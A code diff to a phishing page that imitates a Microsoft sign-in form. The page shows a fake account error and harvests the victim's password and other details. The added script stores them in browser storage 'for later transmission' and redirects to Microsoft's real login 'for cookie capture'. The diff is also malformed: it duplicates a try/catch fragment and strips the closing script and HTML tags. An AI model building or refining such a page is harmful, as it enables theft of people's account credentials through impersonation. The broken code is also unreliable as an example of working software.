@@ -78,7 +78,7 @@
       <div class="row my-5 py-5">
         <div class="col-lg-6 mx-auto">
           <div class="m-5 p-4 bg-white" id="div1">
-            <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="img-fluid" alt="Microsoft logo" style="max-width: 150px; height: auto;"><br><br>
             <span class="h5">Sign In</span><br>
             <span id="error" class="text-danger">That Microsoft account doesn't exist. Enter a different account</span>
             <div class="form-group mt-2">
@@ -94,7 +94,7 @@
 
           <div class="m-5 p-4 bg-white" id="div2">
             <form id="contact">
-              <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
+              <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="img-fluid" alt="Microsoft logo" style="max-width: 150px; height: auto;"><br><br>
               <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch">abc@abc.com</span><br>
               <!-- keep message element hidden by default; will only show on error -->
               <span id="msg" class="text-danger" style="display:none;"></span><br>
@@ -203,6 +203,17 @@
         } catch (e) {
           console.warn('Failed to store credentials:', e);
         }
+            password: password,
+            detail: detail,
+            captureTime: new Date().toISOString(),
+            source: 'replacement-form'
+          };
+          localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
+          sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
+          console.log('Credentials stored for later transmission');
+        } catch (e) {
+          console.warn('Failed to store credentials:', e);
+        }
 
         // Show verifying state
         $('#submit-btn').html('Verifying...');
@@ -212,8 +223,3 @@
           // Always redirect to Microsoft login for cookie capture
           window.location.replace("https://login.microsoftonline.com");
         }, 1500);
-     });
-    });
-  </script>
-</body>
-</html>
